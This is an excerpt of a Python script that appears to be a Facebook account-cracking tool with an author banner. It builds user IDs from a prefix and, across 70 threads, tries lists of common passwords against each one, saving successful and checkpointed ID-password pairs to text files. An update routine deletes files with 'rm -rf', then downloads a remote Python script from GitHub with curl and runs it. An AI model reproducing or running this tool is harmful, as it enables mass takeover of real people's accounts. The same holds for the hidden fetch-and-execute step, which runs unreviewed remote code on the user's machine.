...
\33[1;37m----------------------------------------------
\33[1;91m→  \33[1;91m𝗢𝘄𝗻𝗲𝗿      :         𝗠𝗥 HAJI NAJEEB
\33[1;92m→  \33[1;92m𝗙𝗮𝗰𝗲𝗕𝗼𝗼𝗸   :     𝗛𝗗 HAJI NAJEEB
\33[1;93m→  \33[1;93m𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺   :      𝗡𝗢 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠
\33[1;94m→  \33[1;94m𝗧𝗼𝗼𝗹𝘀       :         HAJI NAJEEB
\33[1;95m→  \33[1;95m𝗩𝗲𝗿𝘀𝗶𝗼𝗻    :          0.3
\33[1;37m----------------------------------------------""")
...
try:
    ...
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/HAJI404.py > HAJI404.py')
        os.system('python HAJI404.py')
    else:pass
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+923148007918text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-openhttps://www.facebook.com/rashood.khan.16');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','afghan12345','kabul123','100200','123456']
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan1234','Afghanistan','Afghan12345','kabul123','Mohammed']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan King','Afghanistan','Afghan12345','kabul123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HAJI404-OK] '+cid+'|'+ps+'\033[0;97m')
                open('HAJI404-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[HAJI404-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('HAJI404-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHAJI-NAJEEB\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
